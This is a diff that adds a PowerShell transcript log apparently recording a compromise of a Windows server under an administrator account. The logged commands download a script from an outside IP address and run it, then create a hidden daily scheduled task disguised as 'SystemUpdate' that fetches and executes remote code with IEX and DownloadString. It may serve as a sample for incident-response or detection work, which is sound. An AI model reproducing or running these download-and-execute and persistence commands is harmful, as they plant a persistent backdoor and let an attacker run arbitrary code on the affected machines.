@@ -1,0 +1,20 @@
+PowerShell transcript start
+Start time: 20231115092512
+Username: CORP\Administrator
+RunAs User: CORP\Administrator
+Machine: SERVER01 (Microsoft Windows NT 10.0.17763.0)
+Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden
+Process ID: 3344
+
+***********************
+Transcript started, output file is C:\temp\transcript.txt
+PS C:\Users\Administrator> Get-Process
+PS C:\Users\Administrator> Invoke-WebRequest -Uri "http://203.0.113.42/payload.ps1" -OutFile "C:\temp\update.ps1"
+PS C:\Users\Administrator> . C:\temp\update.ps1
+Creating persistence...
+Adding scheduled task...
+Task created successfully.
+PS C:\Users\Administrator> schtasks /create /tn "SystemUpdate" /tr "powershell.exe -NonI -W Hidden -c 'IEX (New-Object Net.WebClient).DownloadString(\'http://203.0.113.42/updater.ps1\')'" /sc daily /st 09:00
+SUCCESS: The scheduled task "SystemUpdate" has successfully been created.
+PS C:\Users\Administrator> exit
+***********************
